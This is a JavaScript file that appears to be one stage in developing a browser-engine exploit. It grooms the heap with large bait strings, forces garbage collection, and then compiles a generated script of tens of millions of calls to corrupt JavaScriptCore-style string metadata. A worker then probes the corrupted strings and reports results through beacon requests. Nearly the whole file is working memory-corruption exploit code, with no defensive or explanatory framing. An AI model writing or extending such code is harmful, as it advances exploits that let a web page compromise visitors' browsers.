// p378 - Varied string sizes to determine corruption source
//
// V377 CONFIRMED: ALL 81700 chars are 'A'. ZERO non-A in entire range.
// Corruption is at metadata level only.
//
// DIAGNOSTIC: If .length=81700 comes from thunk code bytes (constant),
// ALL corrupted strings show .length=81700 regardless of original size.
// If it comes from StringImpl m_length corruption, .length should vary
// with original size (or the offset changes).
//
// Test: allocate strings of 50000, 100000, 150000, and 200000 chars.
// Report corrupted .length for each size group.
//
// Also: test hash via Map key insertion (reads V+16 of fake StringImpl).
//
// Beacon prefix: V378-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V378-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V378-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  var workerCode = function() {
    var strings = [];
    var sizes = [];
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V378-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }

    function makeString(len) {
      var s = '';
      var chunk = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
      for (var j = 0; j < len; j += 1000) {
        s += chunk;
      }
      s = s.substring(0, len);
      s.charCodeAt(0);
      return s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // Group A: 4 strings of 50000 chars
        for (var i = 0; i < 4; i++) {
          strings.push(makeString(50000));
          sizes.push(50000);
        }
        // Group B: 4 strings of 100000 chars
        for (var i = 0; i < 4; i++) {
          strings.push(makeString(100000));
          sizes.push(100000);
        }
        // Group C: 4 strings of 150000 chars
        for (var i = 0; i < 4; i++) {
          strings.push(makeString(150000));
          sizes.push(150000);
        }
        // Group D: 2 strings of 200000 chars
        for (var i = 0; i < 2; i++) {
          strings.push(makeString(200000));
          sizes.push(200000);
        }
        beacon('STRINGS-' + strings.length);
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        // Check each string
        for (var i = 0; i < strings.length; i++) {
          try {
            var origLen = sizes[i];
            var curLen = strings[i].length;
            var corrupted = (curLen !== origLen);
            var c0 = strings[i].charCodeAt(0);

            // Report: index, original size, current length, first char, corrupted flag
            beacon('S' + i + '-o' + origLen + '-c' + curLen + '-ch' + c0 + (corrupted ? '-X' : '-OK'));
          } catch(ex) {
            beacon('S' + i + '-o' + sizes[i] + '-CRASH');
          }
        }

        // Phase 2: Hash probing via Map
        // Map.set(key) computes hash internally. We can't directly read the hash,
        // but we can test:
        // - Does Map insertion crash?
        // - Can we retrieve the string from the Map?
        // - Does Map.has() work with an equal string?
        beacon('HASH');
        for (var i = 0; i < strings.length; i++) {
          try {
            var curLen = strings[i].length;
            if (curLen === sizes[i]) continue; // skip uncorrupted

            var m = new Map();
            m.set(strings[i], i);
            var got = m.get(strings[i]);
            beacon('H' + i + '-set-' + (got === i ? 'OK' : 'FAIL'));

            // Check if a NEW string of same content can find it
            // Build a fresh string of curLen 'A' chars
            var fresh = makeString(curLen);
            var found = m.has(fresh);
            beacon('H' + i + '-fresh-' + (found ? 'FOUND' : 'NOTFOUND') + '-fl' + fresh.length);
          } catch(ex) {
            beacon('H' + i + '-CRASH');
          }
        }

        // Phase 3: String comparison
        // Compare corrupted strings against each other
        beacon('CMP');
        var corruptedIdx = [];
        for (var i = 0; i < strings.length; i++) {
          if (strings[i].length !== sizes[i]) corruptedIdx.push(i);
        }
        if (corruptedIdx.length >= 2) {
          try {
            var eq = (strings[corruptedIdx[0]] === strings[corruptedIdx[1]]);
            beacon('CMP01-' + (eq ? 'EQ' : 'NEQ'));
          } catch(ex) {
            beacon('CMP01-CRASH');
          }
          // Compare first corrupted with its own copy via string ops
          try {
            var s0 = strings[corruptedIdx[0]];
            var slice = s0.slice(0, 100);
            beacon('SLICE-' + slice.length + '-ch' + slice.charCodeAt(0));
          } catch(ex) {
            beacon('SLICE-CRASH');
          }
        }

        // Phase 4: typeof and constructor checks
        beacon('TYPE');
        for (var i = 0; i < Math.min(corruptedIdx.length, 4); i++) {
          try {
            var s = strings[corruptedIdx[i]];
            beacon('T' + i + '-' + (typeof s) + '-l' + s.length);
          } catch(ex) {
            beacon('T' + i + '-CRASH');
          }
        }

        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < 20; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-' + baits.length);

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      for (var i = 0; i < baits.length; i++) baits[i] = null;
      baits = null;
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) B('ALL-DONE');
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p378fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p378ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p378ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
